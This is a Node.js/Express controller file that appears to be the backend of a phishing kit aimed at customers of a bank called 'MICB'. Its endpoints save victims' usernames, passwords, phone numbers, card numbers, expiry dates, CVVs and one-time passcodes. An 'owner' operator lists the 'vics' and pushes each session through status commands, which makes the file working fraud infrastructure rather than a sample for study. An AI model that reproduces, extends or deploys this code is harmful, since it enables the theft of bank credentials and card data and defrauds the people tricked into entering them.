const MICB = require("../models/micbModel");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  MICB.find({ owner })
    .sort({ timestamp: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const command = async (req, res) => {
  const { uniqueid, status } = req.body;
  try {
    await MICB.findOneAndUpdate({ uniqueid }, { status }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  MICB.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { username, password, telephone, uniqueid, owner } = req.body;
  try {
    await MICB.create({
      uniqueid,
      username,
      password,
      telephone,
      status: 1,
      owner,
      timestamp: moment().format(),
    });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { username, password, telephone, uniqueid } = req.body;
  try {
    await MICB.findOneAndUpdate(
      { uniqueid },
      { username, password, telephone, status: 7, timestamp: moment().format() }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitCard = async (req, res) => {
  const { ccnum, ccexp, cvv, uniqueid } = req.body;
  try {
    await MICB.findOneAndUpdate(
      { uniqueid },
      { ccnum, ccexp, cvv, status: 5, timestamp: moment().format() }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await MICB.findOneAndUpdate(
      { uniqueid },
      { otp, status: 3, timestamp: moment().format() }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await MICB.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitCard,
  deleteEntry,
};
